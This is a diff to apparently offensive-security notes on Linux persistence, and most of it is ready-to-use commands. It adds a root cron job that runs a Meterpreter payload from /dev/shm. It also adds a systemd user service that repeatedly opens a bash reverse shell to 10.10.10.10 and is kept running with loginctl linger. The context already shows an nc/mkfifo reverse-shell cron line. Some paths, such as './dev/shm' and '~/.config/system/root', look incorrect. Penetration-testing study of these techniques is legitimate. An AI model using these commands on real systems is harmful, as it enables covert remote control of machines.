@@ -79,6 +79,9 @@ session.name
 
 #### Cron
 ```bash
+# newlines required
+CT="\n1 * * * *   root    ./dev/shm/met.elf\n"
+printf "$CT" | crontab -
 ```
 
 Serve shell script, for example:
@@ -98,6 +101,35 @@ REVSHELL="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1337
 (crontab -l ; echo "@reboot sleep 200 && $REVSHELL")|crontab 2> /dev/null
 ```
 
+#### Systemd
+
+[From this article Systemd persistence](https://medium.com/@alexeypetrenko/systemd-user-level-persistence-25eb562d2ea8)
+```bash
+touch ~/.config/system/root/persistence.service
+# Make p.service 
+[Unit]  
+Description=Just a reverse shell
+
+[Service]  
+ExecStart=/usr/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/8008 0>&1'  
+Restart=always  
+RestartSec=60
+
+[Install]  
+WantedBy=default.target
+```
+
+Enable and start service
+```bash
+systemctl --user enable persistence.service
+systemctl --user start persistence.service 
+# systemd --user only started on login
+# Configure with root run:
+loginctl enable-linger
+# Check if already set:
+/var/lib/systemd/linger/$username_is_here_if_enabled
+```
+
 
 ## References
 
@@ -107,3 +139,4 @@ REVSHELL="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1337
 [linuxbackdoors](https://tryhackme.com/room/linuxbackdoors) - Backdoors
 [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Linux - Persistence.md)
 [Mitre Persistence](https://attack.mitre.org/techniques/T1098)
+[Alexey Petrenko's Systemd persistence](https://medium.com/@alexeypetrenko/systemd-user-level-persistence-25eb562d2ea8)
